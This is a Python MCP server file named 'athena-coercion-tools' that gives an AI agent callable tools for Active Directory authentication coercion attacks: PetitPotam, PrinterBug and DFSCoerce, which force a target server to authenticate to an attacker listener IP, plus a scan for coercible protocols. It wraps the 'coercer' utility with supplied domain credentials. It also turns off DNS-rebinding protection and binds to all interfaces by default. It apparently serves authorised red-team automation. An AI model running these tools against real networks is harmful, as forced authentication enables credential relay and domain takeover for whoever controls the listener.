"""coercion-tools MCP Server for Athena.

Authentication coercion attacks: PetitPotam (MS-EFSR), PrinterBug (MS-RPRN),
DFSCoerce (MS-DFSNM), and coercion method scanning.
Returns JSON with {"facts": [{"trait": ..., "value": ...}]}
to integrate with Athena's fact collection pipeline.
"""

import asyncio
import json
import re

from mcp.server.fastmcp import FastMCP
from mcp.server.transport_security import TransportSecuritySettings

_security = TransportSecuritySettings(
    enable_dns_rebinding_protection=False,
)

mcp = FastMCP("athena-coercion-tools", transport_security=_security)


async def _run_command(cmd: list[str], timeout: int = 120) -> tuple[str, str, int]:
    """Run subprocess asynchronously with timeout."""
    proc = await asyncio.create_subprocess_exec(
        *cmd,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
    )
    try:
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
    except asyncio.TimeoutError:
        proc.kill()
        return "", "Command timed out", -1
    return (
        stdout.decode(errors="replace"),
        stderr.decode(errors="replace"),
        proc.returncode or 0,
    )


@mcp.tool()
async def coerce_petitpotam(
    target: str,
    listener_ip: str,
    username: str = "",
    password: str = "",
    domain: str = "",
) -> str:
    """Trigger PetitPotam (MS-EFSR) authentication coercion.

    Args:
        target: Target server IP or hostname
        listener_ip: Attacker listener IP (for captured auth)
        username: Optional domain username (for authenticated variant)
        password: Optional password
        domain: Optional domain name

    Returns:
        JSON with facts: ad.coercion_result, ad.coerced_auth
    """
    facts: list[dict[str, str]] = []

    try:
        cmd = [
            "coercer", "coerce",
            "-t", target,
            "-l", listener_ip,
            "--filter-protocol-name", "MS-EFSR",
        ]
        if username and password:
            cmd.extend(["-u", username, "-p", password])
            if domain:
                cmd.extend(["-d", domain])

        stdout, stderr, rc = await _run_command(cmd)
        combined = stdout + stderr

        success = (
            "success" in combined.lower()
            or "authentication" in combined.lower()
            or "triggered" in combined.lower()
        )

        facts.append({
            "trait": "ad.coercion_result",
            "value": json.dumps({
                "method": "PetitPotam (MS-EFSR)",
                "target": target,
                "listener": listener_ip,
                "success": success,
            }),
        })

        if success:
            facts.append({
                "trait": "ad.coerced_auth",
                "value": json.dumps({
                    "source": target,
                    "destination": listener_ip,
                    "protocol": "MS-EFSR",
                }),
            })

        return json.dumps({
            "facts": facts,
            "raw_output": combined[:4000],
        })

    except Exception as exc:
        return json.dumps({
            "facts": [],
            "raw_output": "",
            "error": {"type": type(exc).__name__, "message": str(exc)},
        })


@mcp.tool()
async def coerce_printerbug(
    target: str,
    listener_ip: str,
    username: str,
    password: str,
    domain: str,
) -> str:
    """Trigger PrinterBug (MS-RPRN) authentication coercion.

    Args:
        target: Target server IP or hostname (must have Spooler service)
        listener_ip: Attacker listener IP
        username: Domain username
        password: Domain password
        domain: Domain name

    Returns:
        JSON with facts: ad.coercion_result
    """
    facts: list[dict[str, str]] = []

    try:
        cmd = [
            "coercer", "coerce",
            "-t", target,
            "-l", listener_ip,
            "-u", username,
            "-p", password,
            "-d", domain,
            "--filter-protocol-name", "MS-RPRN",
        ]

        stdout, stderr, rc = await _run_command(cmd)
        combined = stdout + stderr

        success = (
            "success" in combined.lower()
            or "authentication" in combined.lower()
            or "triggered" in combined.lower()
        )

        facts.append({
            "trait": "ad.coercion_result",
            "value": json.dumps({
                "method": "PrinterBug (MS-RPRN)",
                "target": target,
                "listener": listener_ip,
                "success": success,
            }),
        })

        return json.dumps({
            "facts": facts,
            "raw_output": combined[:4000],
        })

    except Exception as exc:
        return json.dumps({
            "facts": [],
            "raw_output": "",
            "error": {"type": type(exc).__name__, "message": str(exc)},
        })


@mcp.tool()
async def coerce_dfscoerce(
    target: str,
    listener_ip: str,
    username: str,
    password: str,
    domain: str,
) -> str:
    """Trigger DFSCoerce (MS-DFSNM) authentication coercion.

    Args:
        target: Target server IP or hostname
        listener_ip: Attacker listener IP
        username: Domain username
        password: Domain password
        domain: Domain name

    Returns:
        JSON with facts: ad.coercion_result
    """
    facts: list[dict[str, str]] = []

    try:
        cmd = [
            "coercer", "coerce",
            "-t", target,
            "-l", listener_ip,
            "-u", username,
            "-p", password,
            "-d", domain,
            "--filter-protocol-name", "MS-DFSNM",
        ]

        stdout, stderr, rc = await _run_command(cmd)
        combined = stdout + stderr

        success = (
            "success" in combined.lower()
            or "authentication" in combined.lower()
            or "triggered" in combined.lower()
        )

        facts.append({
            "trait": "ad.coercion_result",
            "value": json.dumps({
                "method": "DFSCoerce (MS-DFSNM)",
                "target": target,
                "listener": listener_ip,
                "success": success,
            }),
        })

        return json.dumps({
            "facts": facts,
            "raw_output": combined[:4000],
        })

    except Exception as exc:
        return json.dumps({
            "facts": [],
            "raw_output": "",
            "error": {"type": type(exc).__name__, "message": str(exc)},
        })


@mcp.tool()
async def coerce_scan(
    target: str,
    username: str,
    password: str,
    domain: str,
) -> str:
    """Scan target for available coercion methods.

    Args:
        target: Target server IP or hostname
        username: Domain username
        password: Domain password
        domain: Domain name

    Returns:
        JSON with facts: ad.coercion_method
    """
    facts: list[dict[str, str]] = []

    try:
        cmd = [
            "coercer", "scan",
            "-t", target,
            "-u", username,
            "-p", password,
            "-d", domain,
        ]

        stdout, stderr, rc = await _run_command(cmd)
        combined = stdout + stderr

        # Parse available methods from coercer scan output
        method_re = re.compile(r"(MS-\w+)\s.*?(VULNERABLE|ACCESSIBLE|LISTENING)", re.IGNORECASE)
        for match in method_re.finditer(combined):
            protocol = match.group(1)
            status = match.group(2)
            facts.append({
                "trait": "ad.coercion_method",
                "value": json.dumps({
                    "target": target,
                    "protocol": protocol,
                    "status": status,
                }),
            })

        # If no regex matches, try line-by-line heuristic
        if not facts:
            for line in combined.splitlines():
                stripped = line.strip()
                if "MS-" in stripped and ("vulnerable" in stripped.lower() or "listening" in stripped.lower()):
                    facts.append({
                        "trait": "ad.coercion_method",
                        "value": stripped[:200],
                    })

        return json.dumps({
            "facts": facts,
            "raw_output": combined[:4000],
        })

    except Exception as exc:
        return json.dumps({
            "facts": [],
            "raw_output": "",
            "error": {"type": type(exc).__name__, "message": str(exc)},
        })


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser()
    parser.add_argument(
        "--transport",
        default="stdio",
        choices=["stdio", "sse", "streamable-http"],
    )
    parser.add_argument("--host", default="0.0.0.0")
    parser.add_argument("--port", type=int, default=8080)
    args = parser.parse_args()

    mcp.settings.host = args.host
    mcp.settings.port = args.port
    mcp.run(transport=args.transport)
